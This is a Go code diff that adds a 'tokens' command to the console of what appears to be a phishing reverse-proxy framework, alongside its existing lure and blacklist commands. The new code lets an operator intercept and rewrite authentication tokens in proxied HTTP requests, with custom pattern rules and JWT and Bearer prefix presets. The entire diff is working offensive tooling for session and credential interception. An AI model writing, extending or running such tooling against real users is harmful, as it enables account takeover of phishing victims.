@@ -147,6 +147,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("lures: %v", err)
 			}
+		case "tokens":
+			cmd_ok = true
+			err := t.handleTokens(args[1:])
+			if err != nil {
+				log.Error("tokens: %v", err)
+			}
 		case "blacklist":
 			cmd_ok = true
 			err := t.handleBlacklist(args[1:])
@@ -1131,6 +1137,167 @@ func (t *Terminal) handleLures(args []string) error {
 	return fmt.Errorf("invalid syntax: %s", args)
 }
 
+func (t *Terminal) handleTokens(args []string) error {
+	hiblue := color.New(color.FgHiBlue)
+	yellow := color.New(color.FgYellow)
+	higreen := color.New(color.FgHiGreen)
+	green := color.New(color.FgGreen)
+	red := color.New(color.FgRed)
+	cyan := color.New(color.FgCyan)
+
+	if len(args) == 0 {
+		// Show status
+		status := "disabled"
+		statusColor := red
+		if t.p.IsTokenModifierEnabled() {
+			status = "enabled"
+			statusColor = higreen
+		}
+		log.Info("Token modification status: %s", statusColor.Sprint(status))
+
+		rules := t.p.GetTokenModifier().ListRules()
+		if len(rules) > 0 {
+			log.Info("\nConfigured rules:")
+			for _, rule := range rules {
+				enabledStr := "disabled"
+				enabledColor := red
+				if rule.Enabled {
+					enabledStr = "enabled"
+					enabledColor = green
+				}
+				log.Info("  %s [%s] - %s: %s", 
+					enabledColor.Sprint(enabledStr), 
+					cyan.Sprint(rule.Action),
+					yellow.Sprint(rule.Description),
+					rule.Pattern.String())
+			}
+		} else {
+			log.Info("No rules configured")
+		}
+		return nil
+	}
+
+	switch args[0] {
+	case "enable":
+		t.p.EnableTokenModifier()
+		log.Success("Token modification enabled")
+		return nil
+
+	case "disable":
+		t.p.DisableTokenModifier()
+		log.Success("Token modification disabled")
+		return nil
+
+	case "status":
+		status := "disabled"
+		statusColor := red
+		if t.p.IsTokenModifierEnabled() {
+			status = "enabled"
+			statusColor = higreen
+		}
+		log.Info("Token modification status: %s", statusColor.Sprint(status))
+		return nil
+
+	case "list":
+		rules := t.p.GetTokenModifier().ListRules()
+		if len(rules) == 0 {
+			log.Info("No token modification rules configured")
+			return nil
+		}
+
+		log.Info("Token modification rules:")
+		for i, rule := range rules {
+			enabledStr := "disabled"
+			enabledColor := red
+			if rule.Enabled {
+				enabledStr = "enabled"
+				enabledColor = green
+			}
+			log.Info("%d. %s [%s] %s -> %s", 
+				i+1,
+				enabledColor.Sprint(enabledStr),
+				cyan.Sprint(rule.Action),
+				rule.Pattern.String(),
+				yellow.Sprint(rule.Value))
+			log.Info("   Description: %s", rule.Description)
+		}
+		return nil
+
+	case "clear":
+		t.p.GetTokenModifier().ClearRules()
+		log.Success("All token modification rules cleared")
+		return nil
+
+	case "add":
+		if len(args) < 2 || args[1] != "rule" {
+			return fmt.Errorf("usage: tokens add rule <pattern> <action> <value> <description> <location> <target>")
+		}
+		if len(args) < 8 {
+			return fmt.Errorf("usage: tokens add rule <pattern> <action> <value> <description> <location> <target>")
+		}
+		pattern := args[2]
+		action := args[3]
+		value := args[4]
+		description := args[5]
+		location := TokenLocation(args[6])
+		target := args[7]
+
+		err := t.p.GetTokenModifier().AddRule(pattern, action, value, description, location, target)
+		if err != nil {
+			return fmt.Errorf("failed to add rule: %v", err)
+		}
+		log.Success("Token rule added: %s", description)
+		return nil
+
+	case "rule":
+		if len(args) < 3 {
+			return fmt.Errorf("usage: tokens rule <enable|disable> <description>")
+		}
+		action := args[1]
+		description := strings.Join(args[2:], " ")
+
+		switch action {
+		case "enable":
+			t.p.GetTokenModifier().EnableRule(description)
+			log.Success("Rule enabled: %s", description)
+		case "disable":
+			t.p.GetTokenModifier().DisableRule(description)
+			log.Success("Rule disabled: %s", description)
+		default:
+			return fmt.Errorf("invalid action: %s (use enable or disable)", action)
+		}
+		return nil
+
+	case "preset":
+		if len(args) < 3 {
+			return fmt.Errorf("usage: tokens preset <jwt|bearer> <prefix>")
+		}
+		presetType := args[1]
+		prefix := args[2]
+
+		switch presetType {
+		case "jwt":
+			err := t.p.GetTokenModifier().SetJWTPrefix(prefix)
+			if err != nil {
+				return fmt.Errorf("failed to set JWT prefix: %v", err)
+			}
+			log.Success("JWT prefix rule added: %s", prefix)
+		case "bearer":
+			err := t.p.GetTokenModifier().SetBearerTokenPrefix(prefix)
+			if err != nil {
+				return fmt.Errorf("failed to set Bearer prefix: %v", err)
+			}
+			log.Success("Bearer token prefix rule added: %s", prefix)
+		default:
+			return fmt.Errorf("invalid preset type: %s (use jwt or bearer)", presetType)
+		}
+		return nil
+
+	default:
+		return fmt.Errorf("invalid command: %s", args[0])
+	}
+}
+
 func (t *Terminal) monitorLurePause() {
 	var pausedLures map[string]int64
 	pausedLures = make(map[string]int64)
@@ -1236,6 +1403,25 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_desc"}, "edit <id> og_des <title>", "sets opengraph description that will be shown in link preview, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
+
+	h.AddCommand("tokens", "general", "manage token modification in requests", "Manage token modification functionality for intercepting and modifying authentication tokens in HTTP requests.", LAYER_TOP,
+		readline.PcItem("tokens", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("status"),
+			readline.PcItem("add", readline.PcItem("rule")), 
+			readline.PcItem("rule", readline.PcItem("enable"), readline.PcItem("disable")),
+			readline.PcItem("list"), readline.PcItem("clear"),
+			readline.PcItem("preset", readline.PcItem("jwt"), readline.PcItem("bearer"))))
+
+	h.AddSubCommand("tokens", nil, "", "show token modifier status")
+	h.AddSubCommand("tokens", []string{"enable"}, "enable", "enable token modification globally")
+	h.AddSubCommand("tokens", []string{"disable"}, "disable", "disable token modification globally")
+	h.AddSubCommand("tokens", []string{"status"}, "status", "show current token modification status")
+	h.AddSubCommand("tokens", []string{"add", "rule"}, "add rule <pattern> <action> <value> <description> <location> <target>", "add custom token modification rule")
+	h.AddSubCommand("tokens", []string{"rule", "enable"}, "rule enable <description>", "enable specific token rule by description")
+	h.AddSubCommand("tokens", []string{"rule", "disable"}, "rule disable <description>", "disable specific token rule by description")
+	h.AddSubCommand("tokens", []string{"list"}, "list", "list all configured token modification rules")
+	h.AddSubCommand("tokens", []string{"clear"}, "clear", "clear all token modification rules")
+	h.AddSubCommand("tokens", []string{"preset", "jwt"}, "preset jwt <prefix>", "add prefix to JWT tokens")
+	h.AddSubCommand("tokens", []string{"preset", "bearer"}, "preset bearer <prefix>", "add prefix to Bearer tokens")
 
 	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
 		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
